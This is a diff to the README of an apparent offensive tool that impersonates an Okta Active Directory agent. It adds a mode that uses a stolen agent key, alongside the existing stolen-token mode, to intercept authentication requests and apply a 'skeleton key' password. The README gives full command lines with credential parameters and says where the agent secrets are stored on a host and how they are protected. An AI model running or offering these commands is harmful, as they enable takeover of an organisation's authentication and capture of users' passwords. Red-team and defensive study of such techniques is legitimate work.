@@ -16,15 +16,23 @@ pip install -r requirements.txt
 
 ### Usage
 
-Two modes are supported:
+Three modes are supported:
 
-1. Use an stolen AD Agent token to connect to Okta and intercept authentication requests:
+1. Use a stolen AD Agent token (agent version < 3.18.0) to connect to Okta and intercept authentication requests:
 
 ```bash
 python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 0023452Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
 ```
 
-2. Register a new AD Agent with Okta and intercept authentication requests:
+2. Use a stolen AD Agent key (agent version >= 3.18.0) to connect to Okta and intercept authentication requests:
+
+```bash
+python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 key --app-id 0o[...]7 --agent-id a5[...]7 --client-id wl[...]7 --agent-key '{"d":"LA[...]=","p":"1r[...]=","q":"xm[...]=","dp":"eo[...]=","dq":"Pr[...]=","qp":"Ae[...]=","n":"pm[...]=","e":"AQAB"}'
+```
+
+The `AppId`, `AgentId`, `ClientId` and `AgentKey` parameters can be found in the `OktaAgentService.exe.config` file. The `AgentKey` setting is, like the `AgentToken` in older versions, protected with the DPAPI master key of the account running the Okta AD Agent service.
+
+3. Register a new AD Agent with Okta and intercept authentication requests:
 
 > Note: You'll need an OAuth Response Code which you can get from:
 
